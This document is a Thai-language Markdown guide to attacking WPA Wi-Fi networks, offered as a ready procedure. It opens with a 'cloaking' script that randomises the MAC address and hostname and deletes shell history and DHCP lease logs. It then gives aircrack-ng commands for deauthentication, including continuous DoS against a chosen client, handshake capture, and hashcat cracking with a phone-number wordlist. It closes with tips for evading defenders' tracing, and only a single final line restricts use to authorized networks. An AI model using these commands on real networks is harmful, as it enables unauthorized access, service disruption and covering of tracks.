# 🔥 Wi-Fi Attack Lab + Red Team Survival Guide (Markdown)

## 🧭 สารบัญ
- [ภาพรวม Lab](#ภาพรวม-lab)
- [เครื่องมือที่ใช้](#เครื่องมือที่ใช้)
- [การพรางตัวก่อนโจมตี (Red Team Cloaking)](#การพรางตัวก่อนโจมตี-red-team-cloaking)
- [การตั้งค่าอะแดปเตอร์ให้พร้อมใช้งาน](#การตั้งค่าอะแดปเตอร์ให้พร้อมใช้งาน)
- [การปิด NetworkManager และวิธีกลับมาเปิด](#การปิด-networkmanager-และวิธีกลับมาเปิด)
- [การสแกน Wi-Fi และค้นหาเป้าหมาย](#การสแกน-wi-fi-และค้นหาเป้าหมาย)
- [การดักจับ Handshake](#การดักจับ-handshake)
- [การยิง deauth (ไล่ client ออกเพื่อดัก handshake)](#การยิง-deauth-ไล่-client-ออกเพื่อดัก-handshake)
- [การแปลงไฟล์ .cap เป็น .hccapx / .22000](#การแปลงไฟล์-cap-เป็น-hccapx--22000)
- [การ Brute-force ด้วย Hashcat บน Windows](#การ-brute-force-ด้วย-hashcat-บน-windows)
- [แนวทางการหลบการตามรอยจาก Blue Team](#แนวทางการหลบการตามรอยจาก-blue-team)
- [การกลับสู่โหมด Managed Mode](#การกลับสู่โหมด-managed-mode)

---

## 🧪 ภาพรวม Lab

- ใช้ Kali Linux เป็นเครื่องโจมตี (VM หรือเครื่องจริง)
- ใช้ USB Wi-Fi Adapter ที่รองรับ Monitor Mode & Packet Injection เช่น RTL8812AU
- เป้าหมาย: ดัก Handshake แล้ว Brute-force หา Password

---

## 🛠 เครื่องมือที่ใช้

| เครื่องมือ | หน้าที่ |
|------------|---------|
| `airmon-ng` | เปิด/ปิดโหมด monitor, ตรวจสอบ process ที่รบกวน |
| `airodump-ng` | สแกน Access Point และ Client |
| `aireplay-ng` | ยิง deauth (ไล่ Client ออก) |
| `hcxpcapngtool` | แปลง .cap → .22000 (ใช้แทน cap2hccapx) |
| `hashcat` | Brute-force password |
| `nmcli`, `iwconfig` | จัดการการ์ด Wi-Fi |
| `ip`, `ifconfig` | จัดการ IP, เปิด/ปิดอินเทอร์เฟส |

---

## 🕶 การพรางตัวก่อนโจมตี (Red Team Cloaking)

ก่อนเริ่มโจมตีทุกครั้ง (เช่นสแกน Wi-Fi หรือยิง deauth) ควรทำการพรางตัวเพื่อหลีกเลี่ยงการถูกตามรอย โดยเฉพาะในแล็บที่จำลองสถานการณ์จริง

### 📜 Shell Script ตัวอย่าง

```bash
#!/bin/bash
# 🕶 Red Team Cloaking Script – Pre-Attack Setup (Interactive Version)

# รับค่า interface และ hostname จากผู้ใช้
read -p "[?] ใส่ชื่อ Interface (เช่น wlan1): " iface
read -p "[?] ใส่ชื่อ Hostname ใหม่: " newhost

# เปลี่ยนชื่อเครื่อง
hostnamectl set-hostname "$newhost"

# เปลี่ยน MAC address
ip link set "$iface" down
macchanger -r "$iface"
ip link set "$iface" up

# แสดงผลหลังเปลี่ยน
echo "[+] Hostname:" $(hostname)
macchanger -s "$iface"

# ล้าง log พื้นฐาน
rm -f ~/.zsh_history ~/.bash_history 2>/dev/null
truncate -s 0 /var/lib/dhcp/dhclient.leases 2>/dev/null

echo "[+] Cloaking complete on $iface. Ready for Monitor Mode."

```

### ✅ เทคนิคเสริม

| เทคนิค | รายละเอียด |
|--------|------------|
| 🧥 เปลี่ยน MAC | ใช้ `macchanger -r wlan1` |
| 🪪 เปลี่ยน hostname | ใช้ `hostnamectl set-hostname` |
| 🛡 ใช้ VPN + TOR | ซ้อนหลายชั้นเพื่อพราง IP |
| 💾 ใช้ Live USB / VM | ไม่ทิ้ง log บนเครื่องจริง |
| 🔒 หลีกเลี่ยง Wi-Fi บ้าน | เพื่อป้องกันการ trace |
| 🧽 ล้าง log | เช่น `.zsh_history`, `dhclient.leases` |

---

## 📡 การตั้งค่าอะแดปเตอร์ให้พร้อมใช้งาน

ในการดักจับ packet หรือยิง deauth จำเป็นต้องใช้ Wi-Fi adapter ที่สามารถเข้าสู่ **Monitor Mode** ได้ โดยมี 2 วิธีหลัก:

### 🔧 วิธีที่ 1: ตั้งค่าด้วย `ip` และ `iw`

```bash
sudo ip link set wlan1 down                          # ปิดการทำงานชั่วคราว
sudo iw dev wlan1 set type monitor                   # เปลี่ยนโหมดเป็น monitor
sudo ip link set wlan1 up                            # เปิดกลับ
```

### 🧪 วิธีที่ 2: ใช้ `airmon-ng` (สะดวกและอัตโนมัติ)

```bash
sudo airmon-ng start wlan1
```

> ✅ หลังจากสั่ง `start` ชื่ออินเทอร์เฟสอาจเปลี่ยนเป็น `wlan1mon` (ขึ้นอยู่กับ driver)

---

### ✅ ความสามารถของ `airmon-ng` เพิ่มเติม

`airmon-ng` ไม่ได้แค่เปิด monitor mode แต่ยังช่วยดูแลสภาพแวดล้อมด้วย เช่น:

| คำสั่ง | ความสามารถ |
|--------|-------------|
| `airmon-ng` | แสดงอะแดปเตอร์ Wi-Fi ทั้งหมด |
| `airmon-ng start wlan1` | เปิด monitor mode |
| `airmon-ng stop wlan1mon` | ปิด monitor mode |
| `airmon-ng check` | ตรวจสอบว่า process ใดอาจรบกวน monitor mode |
| `airmon-ng check kill` | ฆ่า process ที่รบกวน เช่น `NetworkManager`, `wpa_supplicant` |

📌 **ตัวอย่างผลลัพธ์จาก `check`:**
```
Found 3 processes that could cause trouble.
If airodump-ng, aireplay-ng or airtun-ng stops working after
a short period of time, you may want to kill (some of) them!

PID     Name
1234    NetworkManager
2345    wpa_supplicant
```

✅ ใช้ `airmon-ng check kill` เพื่อจัดการ:

```bash
sudo airmon-ng check kill
```

> ⚠️ การ kill NetworkManager จะทำให้ Wi-Fi ปกติหลุด ต้องเปิดใหม่ภายหลัง

---

🎯 **สรุป:**  
- ถ้าใช้ `airmon-ng` → ได้ทั้งเปิด monitor mode และเคลียร์ process อัตโนมัติ  
- ถ้าใช้ `iw` / `ip` → ต้องเช็ค process เอง และอย่าลืม `set type managed` หากจะกลับมาใช้เน็ตปกติ

---

## 📴 การปิด NetworkManager และวิธีกลับมาเปิด

```bash
# ปิด
sudo systemctl stop NetworkManager.service
sudo systemctl disable NetworkManager.service

# เปิดกลับ
sudo systemctl enable NetworkManager.service
sudo systemctl start NetworkManager.service
```

---

## 🔍 การสแกน Wi-Fi และค้นหาเป้าหมาย

```bash
sudo airodump-ng wlan1
```

หากต้องการเจาะจง:
```bash
sudo airodump-ng --bssid <BSSID> --channel <CH> -w capture wlan1
```

---

## 🕵️ การดักจับ Handshake

1. ใช้ `airodump-ng` กับ `-w` เพื่อเก็บ `.cap`
2. รอให้ Client เชื่อมต่อหรือยิง deauth ให้หลุด
3. เช็คว่ามี `WPA handshake` มุมขวาบน

---

## 💥 การยิง deauth (ไล่ client ออกเพื่อดัก handshake)

เมื่อเราต้องการดักจับ **WPA Handshake** หนึ่งในเทคนิคที่นิยมใช้คือการยิง **deauthentication packet** เพื่อให้ client หลุดการเชื่อมต่อกับ Access Point แล้วกลับมาเชื่อมใหม่ ทำให้เกิด handshake ใหม่ให้เราดักจับได้ง่ายขึ้น

---

### ✅ วิธีที่ 1: ยิงเฉพาะ client รายตัว

```bash
sudo iwconfig wlan1 channel <CH>  # ตั้ง channel ให้ตรงกับเป้าหมาย
sudo aireplay-ng --deauth 10 -a <BSSID> -c <Client MAC> wlan1
```

📌 ใช้กรณีที่รู้ MAC ของ client แล้ว และต้องการโจมตีแบบเฉพาะเจาะจง

---

### ✅ วิธีที่ 2: ยิง client ทุกตัวใน Access Point เดียวกัน (broadcast)

```bash
sudo iwconfig wlan1 channel <CH>
sudo aireplay-ng --deauth 10 -a <BSSID> wlan1
```

📌 ใช้กรณีไม่รู้ client รายตัว แต่ต้องการบีบให้ทุก client หลุดชั่วคราว

---

### ✅ วิธีที่ 3: ยิงแบบไม่จำกัดจำนวนครั้ง (ยิงรัว ๆ)

```bash
sudo iwconfig wlan1 channel <CH>
sudo aireplay-ng --deauth 0 -a <BSSID> wlan1
```

📌 `--deauth 0` = ยิงไม่จำกัดจำนวนครั้ง (หยุดได้ด้วย Ctrl+C)

---

### ✅ วิธีที่ 4: ยิงใส่ client รายตัวแบบไม่หยุด (DoS)

```bash
sudo iwconfig wlan1 channel <CH>
sudo aireplay-ng --deauth 0 -a <BSSID> -c <Client MAC> wlan1
```

📌 ใช้กรณีต้องการทำ DoS ใส่ client รายใดรายหนึ่งอย่างต่อเนื่อง

---

### ✅ วิธีที่ 5: ยิงแบบ aggressive (หากมีหลาย client)

ยิงหลายรอบติดต่อกัน เพื่อเพิ่มโอกาสให้ client หลุดแน่นอน:

```bash
for i in {1..5}; do
  sudo aireplay-ng --deauth 25 -a <BSSID> wlan1
done
```

---

### ⚠️ หมายเหตุสำคัญ

- ถ้า `aireplay-ng` แจ้งว่า “wlan1 is on channel X but AP uses Y” → ให้หยุด `airodump-ng` ก่อน เพราะมันบังคับ channel อัตโนมัติ
- ถ้าเจอ error เกี่ยวกับ `negative one (-1)` → เพิ่ม `--ignore-negative-one`
- อย่าลืมตรวจสอบว่า adapter รองรับ **packet injection** ด้วย `aireplay-ng --test wlan1`

📚 **Reference**

- https://www.aircrack-ng.org/doku.php?id=aireplay-ng


---

## 🔄 การแปลงไฟล์ .cap เป็น .hccapx / .22000

### 📥 ติดตั้งเครื่องมือแปลง
```bash
sudo apt install hcxtools -y
```

### 🧪 คำสั่งแปลงไฟล์
```bash
# .cap → .22000
hcxpcapngtool -o boonta.22000 boonta.cap
```

> ⚠️ ใช้แทน cap2hccapx ที่เลิกใช้งานแล้ว

---

## 🧠 การ Brute-force ด้วย Hashcat บน Windows

```powershell
.\hashcat.exe -m 22000 -a 0 "D:\boonta.22000" "D:\084_phone.txt" -O --force
```

เช็คผล:
```powershell
.\hashcat.exe -m 22000 --show D:\boonta.22000
```
---

## 🚔 แนวทางการหลบการตามรอยจาก Blue Team

- เปลี่ยน MAC และ hostname ทุกครั้ง
- อย่าใช้ SSID หรือ Wi-Fi ที่ลงทะเบียนชื่อตัวเอง
- หลีกเลี่ยงอแดปเตอร์ภายใน (อาจโดน trace)
- หลีกเลี่ยงการยิง Wi-Fi หน่วยงานรัฐหรือ ISP

---

## 🔁 การกลับสู่โหมด Managed Mode (ใช้งานเน็ตปกติ)

```bash
# 1. ปิดโหมด monitor
sudo airmon-ng stop wlan1

# 2. ตั้งกลับเป็น managed
sudo ip link set wlan1 down
sudo iw dev wlan1 set type managed
sudo ip link set wlan1 up

# 3. เปิด NetworkManager (ถ้าปิดไว้)
sudo systemctl start NetworkManager.service
```

---

📌 **หมายเหตุ:** ทุกขั้นตอนต้องกระทำบน Wi-Fi ที่คุณมีสิทธิ์และเพื่อการศึกษาเท่านั้น!
